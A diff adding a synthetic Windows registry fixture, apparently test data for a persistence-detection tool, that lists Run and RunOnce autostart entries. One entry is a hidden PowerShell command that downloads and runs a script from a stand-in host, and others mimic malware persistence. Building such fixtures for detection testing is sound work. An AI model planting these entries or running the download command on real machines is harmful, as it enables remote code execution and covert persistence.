@@ -1,0 +1,7 @@
+; Synthetic SOFTWARE hive placeholder (NOT a real registry hive)
+[Microsoft\Windows\CurrentVersion\Run]
+"BadUpdater"="C:\\Users\\Public\\updater.exe /silent"
+"SystemFix"="cmd.exe /c powershell -nop -w hidden IEX(New-Object Net.WebClient).DownloadString('http://malicious.example.com/run.ps1')"
+
+[Microsoft\Windows\CurrentVersion\RunOnce]
+"Cleanup"="wscript.exe C:\\Users\\Admin\\AppData\\Local\\Temp\\clean.js"
